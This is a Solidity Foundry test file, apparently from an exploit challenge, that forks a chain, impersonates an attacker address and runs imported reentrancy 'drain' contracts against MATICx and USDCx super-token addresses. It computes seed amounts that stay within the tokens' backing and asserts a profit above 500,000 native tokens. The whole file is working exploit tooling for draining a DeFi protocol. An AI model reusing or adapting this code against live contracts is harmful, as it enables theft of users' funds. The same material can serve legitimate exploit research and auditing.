// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5Drain, Ch5ERC20Drain} from "../exploit/Run.s.sol";

/// @notice Focused reset-state validation for the stable high-profit path:
///         native MATICx drain followed by one large USDCx helper round.
contract Attempt49NativePlusUSDCReentry20Test is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;

    uint256 internal constant NATIVE_REENTRY_COUNT = 10;
    uint256 internal constant NATIVE_PHASE1_ROUNDS = 4;
    uint256 internal constant NATIVE_GAS_RESERVE = 0.02 ether;
    uint256 internal constant NATIVE_BACKING_MARGIN = 1 gwei;

    uint256 internal constant USDC_BOOTSTRAP_NATIVE = 25_000 ether;
    uint256 internal constant USDC_REENTRY_COUNT = 20;
    uint256 internal constant USDC_MAX_ROUNDS = 1;
    uint32 internal constant USDC_INDEX_BASE = 820_000_000;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_native_plus_usdc_exceeds_500k() public {
        uint256 nativeBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        _runNativeStage();

        uint256 nativeAfterMaticx = ATTACKER.balance;
        Ch5ERC20Drain usdcDrain = new Ch5ERC20Drain(USDCX, ROUTER, USDC_INDEX_BASE, address(0));
        (uint256 roundsExecuted, uint256 nativeOut) =
            usdcDrain.executeDrain{value: USDC_BOOTSTRAP_NATIVE}(USDC_MAX_ROUNDS, USDC_REENTRY_COUNT);
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        uint256 delta = nativeAfter - nativeBefore;

        console.log("native after MATICx:", nativeAfterMaticx);
        console.log("USDC rounds executed:", roundsExecuted);
        console.log("USDC native out:", nativeOut);
        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", nativeAfter);
        console.log("attacker native delta:", delta);

        assertEq(roundsExecuted, 1, "expected exactly one USDC round");
        assertGt(nativeAfterMaticx, USDC_BOOTSTRAP_NATIVE, "native stage did not fund USDC bootstrap");
        assertGt(delta, 500_000 ether, "combined path should exceed 500k native delta");
    }

    function _runNativeStage() internal {
        uint256 nativeSeed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
        require(nativeSeed > 0, "no profitable native round");

        Ch5Drain nativeDrain = new Ch5Drain();
        nativeDrain.executeRound{value: nativeSeed}(NATIVE_REENTRY_COUNT);

        for (uint256 i = 1; i < NATIVE_PHASE1_ROUNDS; ++i) {
            uint256 nextSeed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
            if (nextSeed == 0) {
                break;
            }

            nativeDrain.executeRound{value: nextSeed}(NATIVE_REENTRY_COUNT);
        }

        uint256 nativePhase2Seed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
        if (nativePhase2Seed > 0) {
            Ch5Drain nativePhase2Drain = new Ch5Drain();
            nativePhase2Drain.executeRound{value: nativePhase2Seed}(NATIVE_REENTRY_COUNT);
        }
    }

    function _computeNativeSeed(uint256 attackerNative, uint256 maticxBackingBefore) internal pure returns (uint256) {
        if (attackerNative <= NATIVE_GAS_RESERVE) {
            return 0;
        }

        uint256 spendable = attackerNative - NATIVE_GAS_RESERVE;
        uint256 safeByBacking = maticxBackingBefore / NATIVE_REENTRY_COUNT;
        if (safeByBacking <= NATIVE_BACKING_MARGIN) {
            return 0;
        }

        unchecked {
            safeByBacking -= NATIVE_BACKING_MARGIN;
        }

        return spendable < safeByBacking ? spendable : safeByBacking;
    }
}
